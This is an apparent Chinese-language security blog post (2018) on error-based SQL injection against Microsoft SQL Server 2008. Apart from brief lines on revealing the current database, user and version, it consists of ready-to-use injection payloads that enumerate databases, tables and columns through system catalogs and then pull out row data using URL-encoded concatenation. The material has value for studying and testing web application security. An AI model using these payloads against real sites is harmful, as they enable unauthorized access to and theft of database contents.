---
title: "MSSQL 显错注入"
date: 2018-01-15T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['mssql','sqli']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

MSSQL 显错注入

<!--more-->

听说 mssql 不同版本的注入语句不同 这里的版本是 mssql 2008.

`db_name() 当前数据库`

`user 当前用户`

`@@version 版本`


**爆库语句**

`id=1 and (select name from master.dbo.sysdatabases where dbid=1)>0`

master.dbo.sysdatabases == master..sysdatabases

**爆表语句**

`id=1 and (select top 1 cast(name as varchar(100))%2b'^'%2bcast(id as varchar(100)) from 数据库.dbo.sysobjects where xtype='U')>0`

**暴列语句**

`id=1 and (select top 1 name from 数据库.dbo.syscolumns where id=id)>0`

**爆数据语句**

`id=1 and (select top 1 cast(列名1 as varchar(100))%2b'^'%2bcast(列名2 as varchar(100)) from 数据库.dbo.表名)>0`

同数据库的话可以直接 from 表名.